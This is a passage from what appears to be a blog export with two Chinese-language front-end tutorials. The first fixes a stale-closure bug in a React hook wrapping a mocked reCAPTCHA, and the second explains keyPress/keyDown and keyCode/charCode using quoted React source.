可以動的範例程式碼在這：https://codesandbox.io/s/simulate-grecaptcha-5z90f 其實就是自己簡單模擬 reCAPTCHA 的行為而已，我們的重點只有：「grecaptcha.render 只能被呼叫一遍」。 主角登場：React hook前面鋪陳了這麼多 reCAPTCHA 的行為以及 class component 的實作，現在終於輪到 React hook 登場了，接著就讓我們直接把上面的範例改成用 hook 來做： const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 程式碼變得清爽好多，React hook 讚讚讚！ 目前我們就只是照著之前 class component 的邏輯來改寫而已，在 componentDidMount 的時候執行 handleLoad，然後 handleLoad 裡面去呼叫 grecaptcha.render 並且設置 callback function，交由 handleCallback 來處理，最後再透過 props.onChange 把 token 傳回去。 試了一下，會發現功能完全沒有問題。這邊是完整程式碼：https://codesandbox.io/s/simulate-grecaptcha-react-hook-kxerd?file=/src/App.js:391-714 可是…真的沒問題嗎？ 乍看之下是這樣，可是其實不然，這樣寫是有問題的，而這就是這篇文章真正要講的重點。 大家可以自己想想看會有什麼問題，再接著往下看。如果你看到這邊已經想到了，而且也知道怎麼解了，那代表你對 hook 有一定的熟悉程度，恭喜恭喜。 真正的問題前面花了很多篇幅在介紹 reCAPTCHA 的使用以及「 grecaptcha.render 只能被呼叫一遍，所以 callback function 的綁定只能進行一遍」這件事情，因為這跟這篇文章要提出的一個重要問題有關，這個問題就是： 如果 props 的 onChange 換了，會發生什麼事？ 你可能會想說：「咦？換掉就換掉啊，會怎樣嗎？」 我提供一個簡單的範例： export default function App() &#123; const [isOld, setIsOld] = useState(true); const oldFunction = () => console.log(\"old function\"); const newFunction = () => console.log(\"new function\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;isOld ? oldFunction : newFunction&#125; /> &lt;button onClick=&#123;() => &#123; console.log(\"Switch to new function\"); setIsOld(false); &#125;&#125; > change function &lt;/button> &lt;/div> ); &#125; 這個範例會根據 state isOld 來決定傳入哪一個 function，預設傳入 oldFunction，點擊按鈕之後會把 isOld 設定成 false，就會傳入 newFunction，然後從 console 就可以看出來，最後被呼叫的到底是哪一個 function，我們改成這樣以後來試試看上面 hook 的範例： 跟你想的一樣嗎？我們明明就把 onChange 這個 props 換成了新的 function，為什麼被呼叫到的還是舊的？我這邊附上完整程式碼讓大家想一下： import React, &#123; useState, useRef, useEffect &#125; from \"react\"; let isCalled = false; const grecaptcha = &#123; render: function(element, &#123; callback &#125;) &#123; if (isCalled) throw new Error(\"You can only call me once\"); isCalled = true; element.innerText = \"click me if you are not robot\"; element.addEventListener(\"click\", function() &#123; callback(\"you got token!\"); &#125;); &#125; &#125;; const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; export default function App() &#123; const [isOld, setIsOld] = useState(true); const oldFunction = () => console.log(\"old function\"); const newFunction = () => console.log(\"new function\"); return ( &lt;div className=\"App\"> &lt;ReCAPTCHA onChange=&#123;isOld ? oldFunction : newFunction&#125; /> &lt;button onClick=&#123;() => &#123; console.log(\"Switch to new function\"); setIsOld(false); &#125;&#125; > change function &lt;/button> &lt;/div> ); &#125; 可以跑的範例：https://codesandbox.io/s/simulate-grecaptcha-react-hook-change-props-chl50?file=/src/App.js 大家在邊想的同時，我們可以邊來看之前的 class component，它會有這個問題嗎？ 不會，運作地十分良好。 （一樣附上完整程式碼：https://codesandbox.io/s/change-props-onchange-jkm1n?file=/src/App.js） 可是為什麼 hook 會有問題，class 就不會？我們不是用同樣的邏輯來改寫的嗎？ 我們來細看一下 class 的運作，自己先看這段重點程式碼模擬一遍： handleCallback = token => &#123; this.props.onChange(token); &#125;; handleLoad = () => &#123; grecaptcha.render(this.divRef.current, &#123; callback: this.handleCallback &#125;); &#125;; 在呼叫 grecaptcha.render 時，我們把 callback function 綁定到 this.handleCallback，而這個 function 會呼叫 this.props.onChange(token)，所以一定可以呼叫到最新的 props 裡面的 onChange 事件，完全沒有問題。 那 hook 呢？ const handleCallback = token => &#123; onChange(token); &#125;; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; useEffect(() => &#123; handleLoad(); &#125;, []); 在元素第一次 render 完以後會去執行 useEffect 裡面的 handleLoad，而裡面會把 callback 綁定到 handleCallback，在裡面再去呼叫 onChange 這個 props，看起來也沒問題啊？ 不，問題可大了。 function 跟 class component 最大的差異，就在於：「function component 會記住當下傳入的值」。這點或許聽起來有點難體會，但只要你把 mental model 建立好我相信就沒問題。你要牢記一件事，那就是： Function component 的每一次 render，都是「重新」呼叫一次 function 聽起來有點廢話，但重點是「重新」這兩個字，以這個方式去思考，你就能理解 function component 的重點。我們用這個方式再重新看一遍上面的流程，底下我有附上每一個步驟的編號，請按照編號閱讀： // 1. 第一次 render，onChange = oldFunction // 2. 呼叫 ReCAPTCHA(&#123; onChange: oldFunction &#125;) // 3. 這邊的 onChange 會等於 oldFunction（這是重點，畫三顆星星必考） const ReCAPTCHA = (&#123; onChange &#125;) => &#123; // 4. 建立 ref const divRef = useRef(); // 5. 建立函式 handleCallback // 11. 當 callback 被觸發時，呼叫 onChange（oldFunction） // 這是重點，畫五顆星星必考 const handleCallback = token => &#123; onChange(token); &#125;; // 6. 建立函式 handleLoad // 10. 執行 handleLoad，把 callback 綁定到 handleCallback const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; // 7. 宣告 useEffect // 9. render 完畢，執行 handleLoad useEffect(() => &#123; handleLoad(); &#125;, []); // 8. render return &lt;div ref=&#123;divRef&#125; />; &#125;; 當使用者點擊「change function」之後，流程是這樣的： // 1. 第二次 render，onChange = newFunction // 2. 呼叫 ReCAPTCHA(&#123; onChange: newFunction &#125;) // 3. 這邊的 onChange 會等於 newFunction const ReCAPTCHA = (&#123; onChange &#125;) => &#123; // 4. 建立 ref const divRef = useRef(); // 5. 建立函式 handleCallback const handleCallback = token => &#123; onChange(token); &#125;; // 6. 建立函式 handleLoad const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; // 7. 宣告 useEffect // 9. render 完畢，但因為不是第一次，所以不會執行 handleLoad useEffect(() => &#123; handleLoad(); &#125;, []); // 8. render return &lt;div ref=&#123;divRef&#125; />; &#125;; 這裡的重點有幾個： 第一次 render 裡的 handleCallback 跟第二次裡的 handleCallback，是兩個完全不同的 function，不是同一個 因此你綁定的是第一次的 handleCallback，就只會執行第一次的，而且第一次的 onChange 是 oldFunction 所以儘管你改變了 onChange，只有第二次的 handleCallback 會執行到新的 newFunction，但你綁定的 callback 是第一次的 handleCallback 這邊的關鍵在於：「第一次 render 裡的 function」跟「第二次 render 裡的 function」已經是完全不同的東西了。在使用 hook 時，有個 eslint 的提示會一直提醒你使用 useEffect 或是 useCallback 的時候要加上的 dependency array，就是為了要讓你能夠獲取到最新的值。 其實在寫上面那段 hook 的程式碼時，eslint 就有跳提醒了，那我們按照它講的來修修看： const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 當 onChange 改變時，就會產生新的 handleCallback const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); // 當 handleCallback 改變時，就會重新呼叫 useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, [handleCallback]); return &lt;div ref=&#123;divRef&#125; />; &#125;; 看起來好像沒什麼問題，有把 dependency 都修好，就能確保 handleCallback 呼叫到的一定是最新的 onChange 事件，馬上來試試看： 完了，怎麼出錯了。 當我們 onChange 改變時，handleCallback 就會跟著變，然後連帶的 useEffect 那一段也會重新執行，所以 grecaptcha.render 就被呼叫了兩遍，就跳出了這個錯誤。還記得我前面特別強調這點嗎？這個問題之所以比較麻煩，就是因為 grecaptcha.render 只能呼叫一遍，所以我們這樣改是行不通的。 接著給大家一個小考驗，大家可以自己試試看開這個 codesandbox 來改，看看能不能改對：https://codesandbox.io/s/react-hook-change-props-fix-gi10h?file=/src/App.js 改對的標準是： 按下「click me if you are not robot」時，console 會印出 old function 按下「change function」不會出錯 再按「click me if you are not robot」時，console 會印出 new function 有達成這三點，你就成功了。 強烈建議大家立刻點開 codesandbox 去試試看，因為沒有試的話，看下面的範例你可能會沒什麼感覺。但如果你有試過，就會深有同感。若是你試了一段時間還是沒成功，可以接著看下面的段落，或許會發現你的錯誤解法。 為什麼你的解法行不通？首先呢，handleLoad 一定只能呼叫一次，所以 useEffect 放的 dependency array 絕對是空陣列，這個沒有問題。而你要思考的就是怎麼樣去改傳入的 callback 以及 handleCallback。 嘗試一你可能試過這種解法，直接把 useEffect 的依賴改成空陣列，然後其他不動： const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 當 onChange 改變時，就會產生新的 handleCallback const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 看起來好像很合理，onChange 變的時候我就改變我的 handleCallback，確認可以在裡面呼叫到最新的 onChange，然後每一次 grecaptcha 改變時都會呼叫到我傳入的 function，也就是 handleCallback，十分合理。 不，你又忽略了前面強調的 mental model： Function component 的每一次 render，都是「重新」呼叫一次 function 我寫一遍執行順序給你看，記得按照順序看： // 1. 第一次執行，呼叫 ReCAPTCHA(&#123; onChange: oldFunction &#125;) // 5. 第二次執行，呼叫 ReCAPTCHA(&#123; onChange: newFunction &#125;) const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); // 2. 第一次執行，產生 handleCallback1 // 6. 第二次執行，產生 handleCallback2 // 8. 當 grecaptcha 的 callback 觸發時，會呼叫到的是 handleCallback1 // 而 handleCallback1 裡的 onChange 是 oldFunction // 因為在建立 handleCallback1 時，傳入的 onChange 是 oldFunction const handleCallback = useCallback( token => &#123; onChange(token); &#125;, [onChange] ); // 3. 第一次 render，執行這個 function // 4. 把 grecaptcha 的 callback 設成 handleCallback1 // 7. 第二次 render，不執行這一段 useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 或是看這張圖片可能比較容易理解： 每一次 render 就是重新呼叫一次 function，你第一次的 function call 會建立一個 handleCallback，當 props.onChange 改變以後，又會建立一個新的 handleCallback，這兩個同名，但是卻是不同的 function。 嘗試二前面說過最大的問題是「當 onChange 改變時會產生不同的 function」，所以想要解決這個問題，就必須有某個「不會變動的東西」。 此時你可能會靈機一動，想說：那這種情況是不是就是 useRef 登場的時候了？ const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const handleCallback = useRef(onChange); // 當 onChange 改變時，去改變 handleCallback.current useEffect(() => &#123; handleCallback.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback.current &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 把 handleCallback.current 傳給 callback，所以每次點擊時都會呼叫到 handleCallback.current，然後我在 useEffect 裡面再去隨著 onChange 更改 handleCallback.current，看起來十分合理。 不，還是不合理，請看底下的圖： 這其實是一個「重新賦值」的問題，我們先把 handleCallback.current 看成是一個變數 A 好了，我們在第一次 render 的時候，在 13 行把 callback 設成 A，然後在二次的 render 的時候，我們執行：handleCallback.current = newFunction，也就是 A = newFunction，我們把 A 重新賦值了，可是原本綁定到 callback 去的還是原本的 A，不會因為你把 A 重新賦值就改變。 嘗試三這時你可能會想說，那既然問題好像是出在直接把 handleCallback.current 掛在 callback 上面，那我再宣告一個 function 不就好了嗎： const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const cbRef = useRef(onChange); const handleCallback = () => &#123; cbRef.current() &#125; useEffect(() => &#123; cbRef.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: handleCallback &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 每次點擊時都會去呼叫 handleCallback，然後在裡面呼叫 cbRef.current()，每當 onChange 改變時，我就去改變 cbRef.current，根本完美。 沒錯，你成功了！而且 handleCallback 其實可以用 useCallback 包起來，就不會每一次 render 時都產生一個新的 handleCallback。 或甚至是你其實根本不需要宣告一個 function，直接用箭頭函式就行了： const ReCAPTCHA = (&#123; onChange &#125;) => &#123; const divRef = useRef(); const cbRef = useRef(onChange); useEffect(() => &#123; cbRef.current = onChange &#125;, [onChange]) useEffect(() => &#123; const handleLoad = () => &#123; grecaptcha.render(divRef.current, &#123; callback: () => &#123; cbRef.current() &#125; &#125;); &#125;; handleLoad(); &#125;, []); return &lt;div ref=&#123;divRef&#125; />; &#125;; 最後的程式碼長這樣，大家可以自己玩玩看：https://codesandbox.io/s/react-hook-change-props-solution-ll8os?file=/src/App.js 回顧與思考在兜了這麼多圈之後，終於找到了解法。可是為什麼以前寫 class component 的時候，從來沒有碰過這個問題？因為我們隨時都可以用 this.props.onChange 拿到最新的屬性。 可是 function component 並不是這樣的，每一次 render 就是一次 function call，而傳進來的 props 就會是「當時」的 props，不會因為 props 改變而改變。這個就是 function component 與 class component 最大的差別。 原本我一直不是很理解之前 dan 哥說的：「唯有拋下 class component，你才能真正理解 hook」是什麼意思，但我現在懂了。以前在 class component 時你會以那些 lifecycle 去思考，去想說「didMount 要做什麼」、「update 的時候要做什麼」，但 hook 的重點會放在「每一次 render」。 class component 是以 class 的 instance 為主體去思考，而 hook 是以 function 為主體去思考。以前在寫 class 的時候，你只會知道 render 這個 method 是每一次 render 都會執行到，其他的 lifecycle 不會。 但是 function component 就是「每一次 render 都會把整個 function 重新執行一遍」，是很不一樣的。最後再強調一次這點： function component 的每一次渲染，都是一個新的 function call 總結雖然說 React hook 看起來容易上手，程式碼也比較少，但我認為今天特地提的這個案例，並沒有讓 hook 在實戰的使用上變得更簡單，某種程度上反而更容易讓新手寫出 bug。或者更精確地說，會出 bug 的地方不一樣。 以前在寫 class 的時候，新手的第一個障礙是 this 的理解，第二個障礙是 props 與 state 永遠會拿到「最新的」而不是當時的。而 function 的障礙就是 closure，如果沒有正確的 mental model，很容易就會在 hook 裡面迷失，畢竟寫 class 跟寫 function component 真的完全不一樣。 原本我以為只是從 class 換到 functoon 只是換一種寫法，沒想到連整個思考模式都換了，衷心佩服 React 團隊的成員，一次次帶給前端這個領域一些全新的東西。 關於 function component 與 class component 的差異，誠心推薦大家去讀 dan 哥的文章，寫的真的很讚，可以先看這一篇：How Are Function Components Different from Classes? 來理解差別，然後再看這篇：A Complete Guide to useEffect 來了解 useEffect，看完之後再來看我文章提到的這個例子會更有感覺，而且可能會覺得：「咦？你這篇在寫什麼廢話，這不是很基本嗎」 這篇文章就差不多到這邊結束了，剛好在學習 hook 的過程中有一個實戰案例可以分享。 最後，特別感謝 Onedegree 的前端同事們跟我一起討論這個問題。","link":"/2020/06/15/react-function-class-hook-useeffect/"},{"title":"從 React 原始碼看 keyPress 與 keyDown 事件","text":"前言前陣子有個學生跑來問我一個問題，說他在寫 React 的時候分不清楚 keyPress 與 keyDown 這兩個事件，還有 keyCode 跟 charCode 這兩個東西，有時候拿得到值，有時候卻拿不到，覺得十分困惑。 我原本以為是 React 做了一些處理，所以去看了一下原始碼。後來發現 React 的確有做一些處理，但實際上這個問題跟 React 沒什麼關係，而是 keyPress 跟 keyDown 這兩個原生的 JavaScript 事件本來就有差異。 所以他碰到的問題跟 React 一點關係都沒有，只是對這部分的事件機制不熟而已。 儘管如此，能夠藉由一個實際的問題來參考一下 React 的實作還是件很不錯的事，而且 React 的註解寫得很好。 因此，這篇會先帶大家來看這兩個事件的不同，最後再來看 React 裡面怎麼做一些處理。 keyPress 跟 keyDown 的差異首先，我們要來看看 keyPress 與 keyDown 這兩個原生事件的差異到底在哪裡，這部分我們直接請出 MDN 來為我們做解釋： The keypress event is fired when a key that produces a character value is pressed down. Examples of keys that produce a character value are alphabetic, numeric, and punctuation keys. Examples of keys that don’t produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta. 來源：https://developer.mozilla.org/en-US/docs/Web/Events/keypress The keydown event is fired when a key is pressed down. Unlike the keypress event, the keydown event is fired for all keys, regardless of whether they produce a character value. 來源：https://developer.mozilla.org/en-US/docs/Web/Events/keydown 簡單來說呢，keyDown 會在你按下任何按鍵時觸發，但是 keyPress 只會在你按下的按鍵可以產生出一個字元的時候觸發，白話一點就是你按下這按鍵是在打字。 例如說你按a，畫面上會出現一個字元 a，所以 keyDown 跟 keyPress 都會觸發。但如果你按shift，畫面上什麼都不會出現，所以只有 keyDown 會觸發。 w3c 提供了一個很不錯的網頁：Key and Character Codes vs. Event Types ，讓你可以自己實驗看看。 下圖中我輸入 a，兩者都會觸發，接著我按 shift，只會觸發 keyDown，再來按 backspace 把文字刪掉，也只會觸發 keyDown： 所以這兩者的差異相信大家應該可以很清楚的知道了，keyDown 可以當作是「按下按鍵」，keyPress 則當作「輸入東西」時會觸發的事件。 接著我們來談談 keyCode 跟 charCode。 keyCode 與 charCode 的差異先來談談 charCode 好了，或許你有看過 JavaScript 裡面有個函式是這樣的： console.log(String.fromCharCode(65)) // A charCode 其實就是某一個字元所代表的一個號碼，或更精確一點地說，就是它的 Unicode 編碼。 這邊如果不太熟的話可以參考這篇文章：[Guide] 瞭解網頁中看不懂的編碼：Unicode 在 JavaScript 中的使用。 在 JavaScript 裡面也可以用另一個函式拿到字元所對應的編碼： console.log(&#39;嗨&#39;.charCodeAt(0)) &#x2F;&#x2F; 21992 若是你把這 21992 轉成 16 進位，會變成 0x55E8，這個其實就是「嗨」的 Unicode： （來源：https://www.cns11643.gov.tw/wordView.jsp?ID=90944） 那什麼是 keyCode 呢？既然 charCode 代表著是一個 char（字元）的 code，那 keyCode 顯然就是代表一個 key（按鍵）的 code。 每一個「按鍵」也都有一個它自己的代碼，而且有時候會讓你混淆，因為它跟 charCode 可能是一樣的。 舉例來說：「A」這個按鍵的 keyCode 是 65，而「A」這個字元的 charCode 也是 65。這應該是為了某種方便性所以這樣設計，但你要注意到一點： 當我按下「A」這個按鍵的時候，我可能要打的是 a 或是 A，有兩種可能 或是舉另外一個例子，當你要打數字 1 時，如果你是用 Q 上方的那顆按鍵而不是用純數字鍵盤，你要打的字可能是「1」或是「!」或甚至是「ㄅ」，因為它們都是同一顆按鍵。 一顆按鍵對應了不只一個字元，所以單單從 keyCode，你是沒辦法判斷使用者想打什麼字的。 講到這裡，我們可以來想一下這兩個跟 keyPress 與 keyDown 的關聯了。 剛剛說到 keyPress 是你要輸入文字的時候才會觸發，所以這個事件會拿到 charCode，因為你要知道使用者打了什麼字。那為什麼不是 keyCode 呢？因為你從 keyCode 根本不知道他打了什麼字，所以拿 keyCode 也沒用。 keyDown 則是在你按下任何按鍵時都會觸發，這時候一定要拿 keyCode，因為你要知道使用者按了什麼按鍵。若是拿 charCode 的話，你按 shift 或是 ctrl 就沒有值了，因為這不是一個字元，就沒辦法知道使用者按了什麼。 總結一下，當你要偵測使用者輸入文字的時候，就用 keyPress，並且搭配 charCode 來看使用者剛剛輸入了什麼；當你想偵測使用者「按下按鍵」的時候，就用 keyDown，搭配 keyCode 獲得使用者所按下的按鍵。 這就是 keyPress、keyDown 以及 keyCode 跟 charCode 的差別。 順帶一提，在輸入中文的時候 keyPress 不會有值，keyDown 則會回傳一個神秘的代碼 229： key 與 which在 keyPress 與 keyDown 這兩個 event 裡面，其實還有兩個屬性：key 與 which。 我們先來看一下 which 是什麼： The which read-only property of the KeyboardEvent interface returns the numeric keyCode of the key pressed, or the character code (charCode) for an alphanumeric key pressed. 來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which 根據我自己的理解，當你在 keyPress 裡面用 which 的時候，拿到的應該就是 charCode；在 keyDown 裡面用的時候就是 keyCode，所以你在寫程式的時候可以統一用 event.which 來拿這個資訊，不必再區分 keyCode 或是 charCode。 不過 MDN 附的參考資料寫的滿模糊的，所以這部分我也不是很確定： which holds a system- and implementation-dependent numerical code signifying the unmodified identifier associated with the key pressed. In most cases, the value is identical to keyCode. 來源：https://www.w3.org/TR/2014/WD-DOM-Level-3-Events-20140925/#widl-KeyboardEvent-which 接著來看一下 key： The KeyboardEvent.key read-only property returns the value of the key pressed by the user while taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale&#x2F;layou 來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key 簡單來說 key 會是一個字串，你剛剛按了什麼按鍵或是打了什麼字，key 就會是什麼。上面 MDN 的網頁下方有附一個簡單的範例讓你來測試 key 的值。 例如說我輸入 A，key 就是 A，按下 Shift，key 就是 Shift。 還有一點要注意的是，這個屬性在 keyPress 或是 keyDown 事件裡面都拿得到。所以儘管是 keyDown 事件，你也能知道使用者剛剛輸入了什麼或是按了什麼按鍵。 但儘管如此，關於「偵測輸入」的事件應該還是用 keyPress 最合適，除非你想要偵測其他不會產生字元的按鍵（Ctrl, Delete, Shift…）才用 keyDown 事件。 在這邊做個中場總結，其實這些 which、keyCode 跟 charCode，在不同瀏覽器上面都可能有不同的表現，所以是跨瀏覽器支援一個很麻煩的部分，從這個方向去找，你可以找到一大堆在講瀏覽器相容性的文章。 但近幾年來舊的瀏覽器漸漸被淘汰，大部分的使用者在用的瀏覽器應該都比較符合標準了，因此相容性並不是本篇文章的重點，所以就沒有多提了。 接下來終於要到可能是最吸引你的部分：React 原始碼。 初探 React 原始碼React 原始碼這麼大，該從何找起呢？ 這邊推薦一個超級好用的方法：GitHub 的搜尋。通常只要拿你想找的 function 名稱或是相關的關鍵字下去搜尋，就能夠把範圍限縮的很小，只要用肉眼再翻一下資料就能夠找到相對應的原始碼，是方便又好用的一個方法。 這邊我們用keyPress來當關鍵字，出現了 12 筆結果： 用肉眼稍微篩選一下，發現很多都是測試，那些都可以直接跳過。你應該很快就能定位到幾個相關的檔案，像是這兩個： packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;SyntheticKeyboardEvent.js packages&#x2F;react-dom&#x2F;src&#x2F;events&#x2F;getEventKey.js 沒錯，這兩個就是今天的主角。 我們先來看SyntheticKeyboardEvent.js，如果你對 React 還算熟悉的話，應該知道你在裡面拿到的事件都不是原生的事件，而是 React 會包裝過之後再丟給你，而現在這個SyntheticKeyboardEvent就是經過 React 包裝後的事件，就是你在 onKeyPress 或是 onKeyDown 的時候會拿到的 e。 為了方便起見，我們切成幾個 function，一個一個來看。 charCode: function(event) &#123; // `charCode` is the result of a KeyPress event and represents the value of // the actual printable character. // KeyPress is deprecated, but its replacement is not yet final and not // implemented in any major browser. Only KeyPress has charCode. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; return 0; &#125; 這邊註解寫得很棒，説 keyPress 已經被 deprecated 了但是替代品還沒準備好。再者，也提到了只有 keyPress 有 charCode。 所以這邊就是判斷 event 的 type 是不是 keypress，是的話就回傳getEventCharCode(event)，否則回傳 0。 接著我們來看一下getEventCharCode在做什麼（小提醒，這個函式在另外一個檔案）： /** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */ function getEventCharCode(nativeEvent) &#123; let charCode; const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125; &#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode; &#125; // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux) // report Enter as charCode 10 when ctrl is pressed. if (charCode === 10) &#123; charCode = 13; &#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them. // Must not discard the (non-)printable Enter-key. if (charCode >= 32 || charCode === 13) &#123; return charCode; &#125; return 0; &#125; 接著我們一樣分段來看比較方便： /** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */ 開頭的註解先跟你說 charCode 代表的就是 character code，所以可以用 String.fromCharCode 來找出搭配的字元。 因此，只有能被印出來（或者是說可以被顯示出來）的字元才有 charCode，而 Enter 是一個例外，因為 Enter 會產生空行。但 Tab 不是，因為你按 Tab 不會產生一個代表 Tab 的字元。 let charCode; const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125; &#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode; &#125; 這邊針對瀏覽器的相容性做處理，FireFox 沒有幫 Enter 設定 charCode，所以要額外判斷 keyCode 是不是 13。然後 IE8 沒有實作 charCode，所以用 keyCode 的值來取代。 // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux) // report Enter as charCode 10 when ctrl is pressed. if (charCode === 10) &#123; charCode = 13; &#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them. // Must not discard the (non-)printable Enter-key. if (charCode >= 32 || charCode === 13) &#123; return charCode; &#125; 這邊應該算是一個 special case，當使用者按下 Ctrl + Enter 時的 charCode 是 10，React 想把這個也當作按下 Enter 來處理。 另外，有些沒辦法被印出來的字元應該要被拿掉，所以最後做了一個範圍的判斷。 charCode 的處理就是這樣了，仔細看看其實還滿有趣的，針對瀏覽器的相容性跟一些特殊狀況做了處理。 接著我們回到SyntheticKeyboardEvent.js，來看看 keyCode 的處理： keyCode: function(event) &#123; // `keyCode` is the result of a KeyDown/Up event and represents the value of // physical keyboard key. // The actual meaning of the value depends on the users' keyboard layout // which cannot be detected. Assuming that it is a US keyboard layout // provides a surprisingly accurate mapping for US and European users. // Due to this, it is left to the user to implement at this time. if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0; &#125; 這邊說 keyCode 的值其實是依賴於鍵盤的，意思是說有些鍵盤可能會產生不太一樣的 keyCode，但因為大多數美國跟歐洲的使用者都是 US keyboard，所以這邊就直接把 keyCode 丟回去而不做特殊處理。 其實這一段我沒有看得完全懂，只是大概猜一下意思而已。這邊指的「keyboard layout」可能是像 QWERTY 或是 Dvorak 這種的 layout，按鍵的排列方式完全不同。但如果這樣就會產生不同的 keyCode 的話，是不是代表有些網站可能會有 bug？ 不過大多數人的鍵盤都是同樣的排列，所以好像不用太擔心這個問題。 which: function(event) &#123; // `which` is an alias for either `keyCode` or `charCode` depending on the // type of the event. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0; &#125; 最後是 which 的部分，如果是 keypress 就把 charCode 傳回去，keydown 或是 keyup 的話就把 keyCode 傳回去。 講到這裡，我們已經看到 React 對於 charCode、keyCode 以及 which 的處理了，charCode 針對特殊情形以及瀏覽器相容性做檢查，keyCode 直接回傳，which 則根據事件不同回傳相對應的值。 最後我們來看一下 key 的處理，這邊放在另外一個檔案叫做getEventKey.js： /** * Normalization of deprecated HTML5 `key` values * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */ const normalizeKey = &#123; Esc: 'Escape', Spacebar: ' ', Left: 'ArrowLeft', Up: 'ArrowUp', Right: 'ArrowRight', Down: 'ArrowDown', Del: 'Delete', Win: 'OS', Menu: 'ContextMenu', Apps: 'ContextMenu', Scroll: 'ScrollLock', MozPrintableKey: 'Unidentified', &#125;; /** * Translation from legacy `keyCode` to HTML5 `key` * Only special keys supported, all others depend on keyboard layout or browser * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */ const translateToKey = &#123; '8': 'Backspace', '9': 'Tab', '12': 'Clear', '13': 'Enter', '16': 'Shift', '17': 'Control', '18': 'Alt', '19': 'Pause', '20': 'CapsLock', '27': 'Escape', '32': ' ', '33': 'PageUp', '34': 'PageDown', '35': 'End', '36': 'Home', '37': 'ArrowLeft', '38': 'ArrowUp', '39': 'ArrowRight', '40': 'ArrowDown', '45': 'Insert', '46': 'Delete', '112': 'F1', '113': 'F2', '114': 'F3', '115': 'F4', '116': 'F5', '117': 'F6', '118': 'F7', '119': 'F8', '120': 'F9', '121': 'F10', '122': 'F11', '123': 'F12', '144': 'NumLock', '145': 'ScrollLock', '224': 'Meta', &#125;; /** * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;string&#125; Normalized `key` property. */ function getEventKey(nativeEvent: KeyboardEvent): string &#123; if (nativeEvent.key) &#123; // Normalize inconsistent values reported by browsers due to // implementations 